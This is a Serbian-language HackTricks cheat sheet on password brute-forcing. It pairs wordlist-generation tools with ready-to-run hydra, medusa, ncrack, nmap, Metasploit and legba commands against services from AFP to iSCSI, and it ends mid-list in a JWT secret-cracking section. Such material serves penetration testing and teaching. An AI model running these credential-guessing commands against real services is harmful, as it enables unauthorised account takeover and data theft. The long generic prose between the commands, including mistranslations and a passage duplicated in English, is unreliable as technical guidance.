# Brute Force - CheatSheet

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** uz pomoć najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Podrazumevane akreditacije

**Pretražite u Google-u** podrazumevane akreditacije tehnologije koja se koristi, ili **probajte ove linkove**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/) 

## **Kreirajte sopstvene rečnike**

Pronađite što više informacija o cilju i generišite prilagođeni rečnik. Alati koji mogu pomoći:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl je alat koji se koristi za prikupljanje reči sa web stranica. Ovaj alat može biti koristan za izgradnju rečnika za napade brute force. Cewl analizira HTML sadržaj web stranica i izvlači reči na osnovu različitih kriterijuma kao što su dužina reči, broj pojavljivanja i slično. Može se koristiti za prikupljanje reči iz veb stranica, blogova, foruma i drugih izvora. Alat takođe podržava filtriranje reči na osnovu različitih kriterijuma kao što su isključivanje određenih reči ili filtriranje samo specifičnih vrsta reči. Cewl je moćan alat koji može pomoći u izgradnji rečnika za napade brute force i poboljšanju efikasnosti ovih napada.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Generišite lozinke na osnovu vašeg znanja o žrtvi (imena, datumi...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Alatka za generisanje liste reči, koja vam omogućava da unesete skup reči i napravite više varijacija od tih reči, stvarajući jedinstvenu i idealnu listu reči za upotrebu u vezi sa određenim ciljem.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Wordlists

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** uz pomoć najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Usluge

Poredane po abecednom redu prema imenu usluge.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) je protokol koji se koristi za komunikaciju između web servera i web aplikacija koje se izvršavaju na Apache Tomcat serveru. Ovaj protokol omogućava efikasnu i brzu razmenu podataka između servera i aplikacija.

Brute force napadi na AJP protokol mogu biti veoma efikasni jer se često koriste slabe lozinke ili podrazumevane vrednosti za autentifikaciju. Da biste izvršili brute force napad na AJP protokol, možete koristiti alate kao što su Hydra ili Medusa.

Prilikom izvođenja brute force napada na AJP protokol, važno je da koristite rečnike sa širokim spektrom lozinki i da podesite odgovarajuće parametre za napad, kao što su broj pokušaja po sekundi i vreme čekanja između pokušaja.

Takođe, možete iskoristiti ranjivosti u implementaciji AJP protokola kako biste izvršili napad. Na primer, neke verzije Apache Tomcat servera imaju ranjivosti koje omogućavaju napadačima da izvrše remote code execution ili da dobiju pristup osetljivim informacijama.

Da biste se zaštitili od brute force napada na AJP protokol, preporučuje se korišćenje snažnih lozinki i podešavanje sigurnosnih parametara na serveru. Takođe, redovno ažurirajte Apache Tomcat server kako biste ispravili poznate ranjivosti.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM i Solace)

AMQP (Advanced Message Queuing Protocol) je otvoreni standard za komunikaciju između aplikacija koje koriste poruke. Postoji nekoliko popularnih implementacija AMQP-a, uključujući ActiveMQ, RabbitMQ, Qpid, JORAM i Solace.

### Brute Force napad na AMQP

Brute Force napad na AMQP se može koristiti za pokušaj otkrivanja lozinki za pristup AMQP serverima. Ovaj napad se zasniva na isprobavanju različitih kombinacija korisničkih imena i lozinki sve dok se ne pronađe ispravna kombinacija.

Da biste izvršili Brute Force napad na AMQP, možete koristiti alate kao što su Hydra ili Medusa. Ovi alati omogućavaju automatizovano isprobavanje različitih kombinacija korisničkih imena i lozinki na AMQP serveru.

Prilikom izvođenja Brute Force napada na AMQP, važno je uzeti u obzir nekoliko faktora kako biste povećali šanse za uspeh:

- Koristite rečnike sa širokim spektrom lozinki kako biste pokrili što više mogućih kombinacija.
- Podesite parametre Brute Force alata kako biste ograničili broj pokušaja po vremenskom periodu i izbegli blokiranje od strane AMQP servera.
- Pratite logove i analizirajte rezultate kako biste identifikovali uspešne kombinacije korisničkih imena i lozinki.

Važno je napomenuti da je Brute Force napad nelegalan i može imati ozbiljne pravne posledice. Uvek se pridržavajte zakona i koristite ove tehnike samo u okviru zakonskih granica, kao deo etičkog hakovanja ili pentestiranja.
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra je distribuirana baza podataka koja se koristi za upravljanje velikim količinama podataka na više čvorova. Ova baza podataka koristi model ključ-vrednost i omogućava horizontalno skaliranje, visoku dostupnost i otpornost na kvarove.

#### Brute Force napadi na Cassandra

Brute Force napadi na Cassandra se mogu koristiti za pokušaj otkrivanja lozinki ili ključeva pristupa. Ovi napadi se obično izvode pomoću automatizovanih alata koji pokušavaju sve moguće kombinacije lozinki ili ključeva sve dok ne pronađu ispravnu vrednost.

Da bi se sprečili Brute Force napadi na Cassandra, preporučuje se primena sledećih mera:

- Postavljanje snažnih lozinki koje se teško mogu pogoditi.
- Implementacija mehanizma zaključavanja naloga nakon određenog broja neuspelih pokušaja prijavljivanja.
- Korišćenje dvofaktornog ili višefaktornog autentifikacije za dodatni sloj sigurnosti.
- Praćenje i analiza logova kako bi se otkrili sumnjivi pokušaji prijavljivanja.

Ukoliko se otkrije Brute Force napad na Cassandra, preporučuje se preduzimanje sledećih koraka:

- Blokiranje IP adrese sa koje dolazi napad.
- Promena lozinke ili ključa pristupa koji je bio kompromitovan.
- Ažuriranje sistema i primena zakrpa kako bi se otklonile ranjivosti koje su iskorišćene u napadu.
- Analiza logova kako bi se identifikovali eventualni drugi napadi ili kompromitovani nalozi.

Važno je napomenuti da je Brute Force napad ilegalan i da se izvođenje ovakvih napada može kažnjavati zakonom. Ove informacije su namenjene isključivo u svrhu edukacije i zaštite sistema od potencijalnih napada.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB je otvorena baza podataka koja koristi JSON format za čuvanje podataka. Ova baza podataka podržava replikaciju i raspodelu podataka na više čvorova. 

#### Brute Force napadi na CouchDB

Brute Force napadi na CouchDB se mogu izvesti na više načina. Evo nekoliko metoda koje se mogu koristiti:

1. **Napad na korisnička imena i lozinke**: Ovaj napad se zasniva na pokušaju svih mogućih kombinacija korisničkih imena i lozinki kako bi se pronašla ispravna kombinacija koja omogućava pristup CouchDB bazi podataka.

2. **Napad na sesije**: Ovaj napad se fokusira na krađu ili preuzimanje sesijskih tokena kako bi se omogućio neovlašćeni pristup CouchDB bazi podataka.

3. **Napad na API ključeve**: Ako CouchDB koristi API ključeve za autentifikaciju, napadač može pokušati da brute force-uje ove ključeve kako bi dobio pristup bazi podataka.

#### Prevencija brute force napada na CouchDB

Da biste sprečili brute force napade na CouchDB, možete preduzeti sledeće mere:

1. **Snažne lozinke**: Koristite snažne lozinke koje kombinuju različite vrste karaktera (velika slova, mala slova, brojeve, specijalne znakove) i imaju dovoljnu dužinu.

2. **Blokiranje IP adresa**: Ako primetite sumnjive aktivnosti ili pokušaje brute force napada, možete blokirati IP adrese sa kojih dolaze ovi napadi.

3. **Dvosmerna autentifikacija**: Omogućite dvosmernu autentifikaciju kako biste dodatno zaštitili pristup CouchDB bazi podataka.

4. **Redovno ažuriranje**: Redovno ažurirajte CouchDB na najnoviju verziju kako biste iskoristili sigurnosne zakrpe i poboljšanja.

5. **Pratite logove**: Pratite logove kako biste identifikovali sumnjive aktivnosti i pokušaje brute force napada.

#### Zaključak

Brute force napadi na CouchDB mogu predstavljati ozbiljnu pretnju za sigurnost podataka. Implementacija sigurnosnih mera kao što su snažne lozinke, blokiranje IP adresa i dvosmerna autentifikacija može pomoći u zaštiti CouchDB baze podataka od ovih napada. Redovno ažuriranje i praćenje logova takođe su važni koraci u održavanju sigurnosti CouchDB sistema.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker registar

Docker registar je servis koji omogućava skladištenje i distribuciju Docker slika. Registar čuva Docker slike na centralizovan način, omogućavajući korisnicima da lako pristupe i preuzmu slike koje su im potrebne.

#### Brute force napadi na Docker registar

Brute force napadi na Docker registar su tehnike koje se koriste za pokušaj otkrivanja lozinki ili pristupa Docker registru. Ovi napadi se obično izvode pomoću automatizovanih alata koji pokušavaju različite kombinacije korisničkih imena i lozinki sve dok ne pronađu ispravne kredencijale.

Da bi se zaštitio Docker registar od brute force napada, preporučuje se primena sledećih mera:

- Korišćenje snažnih lozinki koje se sastoje od kombinacije slova, brojeva i specijalnih karaktera.
- Implementacija mehanizma zaštite od brute force napada, kao što je blokiranje IP adresa nakon određenog broja neuspelih pokušaja prijavljivanja.
- Redovno ažuriranje Docker registra kako bi se ispravile poznate ranjivosti i propusti u bezbednosti.
- Praćenje logova i detekcija sumnjivih aktivnosti koje mogu ukazivati na brute force napade.

Uz pravilne mere bezbednosti, Docker registar može biti siguran i pouzdan način za skladištenje i distribuciju Docker slika.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch je distribuirani sistem za pretragu i analizu podataka. Koristi se za brzo i efikasno pretraživanje, analizu i vizualizaciju velikih skupova podataka. Elasticsearch koristi JSON format za komunikaciju sa serverom i omogućava napredne funkcionalnosti kao što su pretraga punog teksta, agregacija podataka i geolokacija.

#### Brute Force napadi na Elasticsearch

Brute Force napadi na Elasticsearch su tehnike koje se koriste za pokušaj otkrivanja lozinki ili autentifikacionih tokena putem isprobavanja svih mogućih kombinacija. Ovi napadi se obično izvode korišćenjem alata za automatizaciju kao što su Hydra ili Medusa.

Da biste izvršili Brute Force napad na Elasticsearch, prvo morate identifikovati endpoint za autentifikaciju. Zatim možete koristiti alat za Brute Force napad da biste isprobali različite kombinacije korisničkih imena i lozinki ili autentifikacionih tokena. Ovaj proces može biti vremenski zahtevan, ali može biti uspešan ako su lozinke slabe ili autentifikacioni tokeni predvidljivi.

Da biste se zaštitili od Brute Force napada na Elasticsearch, preporučuje se korišćenje snažnih lozinki ili autentifikacionih tokena, kao i implementacija mehanizama zaštite kao što su ograničenje broja pokušaja prijavljivanja i praćenje neuspešnih pokušaja prijavljivanja.

#### Prevencija Brute Force napada na Elasticsearch

Da biste sprečili Brute Force napade na Elasticsearch, možete preduzeti sledeće mere:

- Koristite snažne lozinke ili autentifikacione tokene koji se teško mogu pogoditi.
- Implementirajte mehanizme zaštite kao što su ograničenje broja pokušaja prijavljivanja i praćenje neuspešnih pokušaja prijavljivanja.
- Konfigurišite Elasticsearch tako da blokira IP adrese koje su izvršile previše neuspešnih pokušaja prijavljivanja.
- Redovno ažurirajte Elasticsearch i sve njegove zavisnosti kako biste ispravili poznate sigurnosne propuste.

#### Zaključak

Brute Force napadi na Elasticsearch mogu biti efikasni ako su lozinke slabe ili autentifikacioni tokeni predvidljivi. Korišćenje snažnih lozinki ili autentifikacionih tokena, kao i implementacija mehanizama zaštite, može pomoći u sprečavanju ovih napada. Redovno ažuriranje Elasticsearch i praćenje sigurnosnih propusta takođe su važni koraci u održavanju sigurnosti sistema.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol) je standardni protokol za prenos datoteka preko mreže. Često se koristi za prenos datoteka sa lokalnog računara na udaljeni server ili obrnuto. 

#### Brute Force napad na FTP

Brute Force napad na FTP je tehnika koja se koristi za pokušaj otkrivanja korisničkih imena i lozinki za pristup FTP serveru. Ova tehnika se zasniva na pokušaju svih mogućih kombinacija korisničkih imena i lozinki sve dok se ne pronađe ispravna kombinacija. 

Da biste izvršili Brute Force napad na FTP, možete koristiti alate kao što su Hydra, Medusa ili Patator. Ovi alati automatski pokušavaju različite kombinacije korisničkih imena i lozinki sve dok ne pronađu ispravnu kombinaciju. 

Važno je napomenuti da je Brute Force napad na FTP obično vrlo spor i može potrajati dosta vremena, posebno ako je lozinka složena. Takođe, ovaj napad može biti detektovan od strane sistema zaštite, pa je važno biti oprezan prilikom izvođenja ovog napada.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP Generički Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Osnovna Autentifikacija
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

NTLM (Windows NT LAN Manager) je autentifikacioni protokol koji se često koristi u HTTP komunikaciji. Ovaj protokol se koristi za autentifikaciju korisnika na Windows sistemima.

#### Brute force napad na NTLM autentifikaciju

Brute force napad na NTLM autentifikaciju je tehnika koja se koristi za pokušaj otkrivanja lozinke korisnika putem isprobavanja svih mogućih kombinacija lozinki. Ovaj napad se može izvesti korišćenjem alata kao što su Hydra, Medusa ili John the Ripper.

Da bi se izveo brute force napad na NTLM autentifikaciju, potrebno je imati pristup HTTP zahtevima koji sadrže NTLM autentifikacione podatke. Ovi zahtevi se mogu snimiti korišćenjem alata kao što su Wireshark ili Burp Suite.

Nakon što se dobiju NTLM autentifikacioni podaci, može se pokrenuti brute force napad koristeći rečnik sa potencijalnim lozinkama. Ovaj rečnik može sadržati različite kombinacije reči, brojeva i simbola.

Važno je napomenuti da brute force napad može biti vremenski zahtevan proces, posebno ako je lozinka kompleksna i dugačka. Takođe, postoji rizik od blokiranja naloga nakon određenog broja neuspelih pokušaja autentifikacije.

#### Mere zaštite od brute force napada

Da bi se zaštitili od brute force napada na NTLM autentifikaciju, preporučuje se primena sledećih mera:

- Korišćenje snažnih lozinki koje kombinuju različite karakteristike (velika i mala slova, brojevi, simboli).
- Implementacija mehanizma zaključavanja naloga nakon određenog broja neuspelih pokušaja autentifikacije.
- Korišćenje dvofaktorne autentifikacije za dodatni sloj sigurnosti.
- Redovno ažuriranje softvera i operativnog sistema kako bi se ispravile poznate ranjivosti.
- Praćenje logova autentifikacije radi otkrivanja sumnjivih aktivnosti.

Implementacija ovih mera može značajno smanjiti rizik od uspešnog brute force napada na NTLM autentifikaciju.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Post Form

### HTTP - Slanje forme

When dealing with web applications, it is common to encounter login forms or other types of forms that require user input. In some cases, it may be necessary to automate the process of submitting these forms with different combinations of input values in order to test for vulnerabilities or guess valid credentials. This process is known as brute-forcing.

Kada se bavite veb aplikacijama, često ćete naići na obrasce za prijavljivanje ili druge vrste formi koje zahtevaju unos korisničkih podataka. U nekim slučajevima, može biti potrebno automatizovati proces slanja ovih formi sa različitim kombinacijama vrednosti unosa kako biste testirali ranjivosti ili pogađali ispravne podatke za prijavu. Ovaj proces se naziva brute-forcing.

To perform a brute-force attack on a web form, you need to send HTTP POST requests with different input values for the form fields. The easiest way to do this is by using a tool like cURL or a programming language with HTTP libraries, such as Python with the requests library.

Da biste izvršili brute-force napad na veb formu, morate slati HTTP POST zahteve sa različitim vrednostima unosa za polja forme. Najlakši način za to je korišćenje alata poput cURL-a ili programskog jezika sa HTTP bibliotekama, kao što je Python sa bibliotekom requests.

Here is an example of how to perform a brute-force attack on a login form using cURL:

Evo primera kako izvršiti brute-force napad na formu za prijavljivanje koristeći cURL:

```bash
curl -X POST -d "username=admin&password=123456" http://example.com/login
```

In this example, we are sending a POST request to the URL `http://example.com/login` with the parameters `username=admin` and `password=123456`. You would need to replace `http://example.com/login` with the actual URL of the login form you are targeting, and modify the parameter values accordingly.

U ovom primeru, šaljemo POST zahtev na URL `http://example.com/login` sa parametrima `username=admin` i `password=123456`. Morate zameniti `http://example.com/login` sa stvarnim URL-om forme za prijavljivanje na koju ciljate i prilagoditi vrednosti parametara prema potrebi.

It is important to note that brute-forcing is a time-consuming process and may be illegal or against the terms of service of the target website. Always ensure that you have proper authorization and permission before attempting any brute-force attacks.

Važno je napomenuti da je brute-forcing proces koji oduzima vreme i može biti ilegalan ili protiv uslova korišćenja ciljanog veb sajta. Uvek se uverite da imate odgovarajuću autorizaciju i dozvolu pre nego što pokušate bilo kakve brute-force napade.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Za http**s** morate promeniti "http-post-form" u "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla ili (D)rupal ili (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) je protokol za pristup i upravljanje elektronskom poštom na serveru. Koristi se za čitanje, slanje i brisanje poruka sa servera. IMAP omogućava korisnicima da pristupe svojoj pošti sa različitih uređaja i da sinhronizuju promene između njih. Ovaj protokol se često koristi za pristupanje pošte putem e-pošte klijenata kao što su Microsoft Outlook, Mozilla Thunderbird i Apple Mail. 

#### Brute Force napadi na IMAP

Brute Force napadi na IMAP su tehnike kojima se pokušava otkriti lozinka za pristup IMAP nalogu. Ovi napadi se obično izvode pomoću automatizovanih alata koji isprobavaju različite kombinacije korisničkih imena i lozinki sve dok ne pronađu ispravnu kombinaciju. Napadači mogu koristiti različite metode za izvođenje Brute Force napada na IMAP, kao što su rječnik napadi, napadi sa generisanjem kombinacija i napadi sa snimanjem i reprodukcijom sesija. 

Da bi se zaštitili od Brute Force napada na IMAP, preporučuje se korišćenje snažnih lozinki koje se sastoje od kombinacije slova, brojeva i posebnih znakova. Takođe je važno koristiti mehanizme zaštite kao što su dvofaktorska autentifikacija i ograničenje broja neuspelih pokušaja prijavljivanja. Administratori sistema takođe mogu koristiti alate za detekciju Brute Force napada i blokirati IP adrese napadača.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRC (Internet Relay Chat) je protokol za trenutnu komunikaciju putem interneta. Koristi se za razmenu poruka u realnom vremenu između korisnika koji su povezani na IRC servere. 

#### Brute Force napadi na IRC

Brute Force napadi na IRC su tehnike koje se koriste za pokušaj otkrivanja lozinki korisnika putem isprobavanja različitih kombinacija lozinki. Ovi napadi se obično izvode pomoću automatizovanih alata koji automatski generišu i testiraju veliki broj mogućih lozinki. 

#### Metode Brute Force napada na IRC

1. **Dictionary Attack**: Ova metoda koristi rečnike sa velikim brojem poznatih lozinki kako bi se pokušalo otkriti pravilnu lozinku korisnika. Alat za Brute Force će automatski isprobati svaku lozinku iz rečnika dok ne pronađe odgovarajuću lozinku.

2. **Brute Force Attack**: Ova metoda koristi algoritam za generisanje svih mogućih kombinacija lozinki kako bi se pokušalo otkriti pravilna lozinka korisnika. Alat za Brute Force će automatski generisati i testirati sve moguće kombinacije lozinki dok ne pronađe odgovarajuću lozinku.

#### Prevencija Brute Force napada na IRC

Da biste se zaštitili od Brute Force napada na IRC, možete preduzeti sledeće mere:

1. **Snažne lozinke**: Koristite snažne lozinke koje kombinuju velika i mala slova, brojeve i posebne znakove. Izaberite lozinke koje su teške za pogoditi.

2. **Dvosmerna autentifikacija**: Omogućite dvosmernu autentifikaciju koja zahteva dodatni korak verifikacije prilikom prijavljivanja na IRC server.

3. **Zaključavanje naloga**: Nakon određenog broja neuspelih pokušaja prijavljivanja, zaključajte nalog na određeno vreme kako biste sprečili dalje Brute Force napade.

4. **Nadgledanje logova**: Redovno nadgledajte logove IRC servera kako biste otkrili sumnjive aktivnosti i preduzeli odgovarajuće mere.

5. **Ažuriranje softvera**: Redovno ažurirajte IRC server softver kako biste ispravili poznate sigurnosne propuste i smanjili rizik od Brute Force napada.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

ISCSI (Internet Small Computer System Interface) je standardni protokol za prenos blok podataka preko IP mreže. Ovaj protokol omogućava udaljeni pristup i upravljanje skladišnim uređajima kao što su diskovi, trake i optički mediji. ISCSI se često koristi za povezivanje servera sa udaljenim skladištem podataka.

#### Brute Force napadi na ISCSI

Brute Force napadi na ISCSI su tehnike koje se koriste za pokušaj otkrivanja lozinki ili autentifikacionih ključeva za pristup ISCSI skladištima. Ovi napadi se obično izvode pomoću automatizovanih alata koji sistematski isprobavaju različite kombinacije lozinki sve dok ne pronađu ispravnu.

Da bi se izvršio Brute Force napad na ISCSI, napadač mora imati pristup ISCSI cilju i koristiti alat koji podržava ovu vrstu napada. Napadač može koristiti različite metode za generisanje i isprobavanje lozinki, kao što su rečnici lozinki, kombinacije karaktera ili algoritmi za generisanje lozinki.

Da bi se zaštitili od Brute Force napada na ISCSI, preporučuje se korišćenje snažnih lozinki koje su teško pogoditi. Takođe je važno implementirati mehanizme zaštite kao što su zaključavanje naloga nakon određenog broja neuspelih pokušaja prijavljivanja ili korišćenje dvofaktorne autentifikacije.

Ukoliko se otkrije Brute Force napad na ISCSI, preporučuje se preduzimanje odgovarajućih mera zaštite, kao što je blokiranje IP adrese napadača ili promena lozinke za pristup ISCSI skladištu. Takođe je važno pratiti logove i upozoravati na sumnjive aktivnosti kako bi se sprečili budući napadi.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Token (JWT) je otvoren standard (RFC 7519) koji definiše način za sigurno razmenjivanje podataka između strana u obliku JSON objekata. JWT se često koristi za autentifikaciju i autorizaciju u aplikacijama.

JWT se sastoji od tri dela: zaglavlja, tvrdnji (claims) i potpisa. Zaglavlje sadrži informacije o algoritmu koji se koristi za potpisivanje tokena. Tvrdnje sadrže informacije o subjektu, vremenskom ograničenju tokena i druge korisnički definisane podatke. Potpis se koristi za verifikaciju autentičnosti tokena.

Brute force napad na JWT podrazumeva pokušaj da se otkrije tajni ključ koji se koristi za potpisivanje tokena. Ovaj napad se obično izvodi pokušavajući sve moguće kombinacije ključeva dok se ne pronađe odgovarajući ključ koji generiše validan potpis.

Da bi se sprečio brute force napad na JWT, preporučuje se korišćenje jakih i složenih ključeva, kao i implementacija odgovarajućih mera zaštite, kao što su ograničenje broja pokušaja prijavljivanja, blokiranje IP adresa i korišćenje dvofaktorne autentifikacije. Takođe je važno redovno ažurirati ključeve kako bi se održala sigurnost sistema.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
